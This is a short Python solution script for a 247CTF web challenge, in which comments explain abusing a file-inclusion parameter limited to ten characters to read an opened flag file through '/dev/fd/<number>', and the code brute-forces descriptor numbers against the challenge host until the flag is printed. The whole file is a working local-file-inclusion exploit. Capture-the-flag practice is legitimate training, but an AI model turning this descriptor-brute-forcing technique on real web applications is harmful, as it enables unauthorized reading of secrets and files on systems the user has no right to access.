import requests

# NOTE: On Linux, you can find your file descriptors on many paths,
#       for instance, '/proc/self/fd/<number>', '/dev/fd/<number>', etc.
#       We can abuse these paths to read the opened '/tmp/flag.txt' file through
#       its file descriptor.
# NOTE: Since the include file length must be <= 10, we have to use '/dev/fd/<number>'

ctf_url = "https://2cb0963f208249ff.247ctf.com"

print("Bruteforcing file descriptors to find open flag.txt file...")
for i in range(100):
    resp = requests.get(f"{ctf_url}", [("include", f"/dev/fd/{i}")])
    flag_start = resp.text.find("247CTF{")
    if flag_start != -1:
        flag_end = resp.text.find("}", flag_start)
        print(f"Found flag through file descriptor '{i}':", resp.text[flag_start:flag_end + 1])
        break
else:
    print("Failed to find open file descriptor!")
